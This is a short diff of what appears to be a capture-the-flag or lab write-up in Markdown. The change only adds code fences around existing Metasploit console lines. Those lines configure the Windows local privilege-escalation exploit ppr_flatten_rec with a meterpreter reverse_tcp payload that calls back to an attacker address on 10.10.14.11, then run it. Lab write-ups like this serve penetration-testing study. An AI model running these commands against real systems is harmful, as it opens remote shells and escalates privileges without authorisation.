@@ -57,9 +57,13 @@ msf exploit(windows/local/ppr_flatten_rec) > set lhost 10.10.14.11
 lhost => 10.10.14.11
 msf exploit(windows/local/ppr_flatten_rec) > set WAIT 20
 WAIT => 20
-Set LHOST on reverseTCP:
+```
+**Remember Set LHOST on reverseTCP:
+```shell
 msf exploit(windows/local/ppr_flatten_rec) > set PAYLOAD windows/meterpreter/reverse_tcp
 PAYLOAD => windows/meterpreter/reverse_tcp
+```
+```shell
 msf exploit(windows/local/ppr_flatten_rec) > set LHOST 10.10.14.11
 msf exploit(windows/local/ppr_flatten_rec) > exploit
 *****
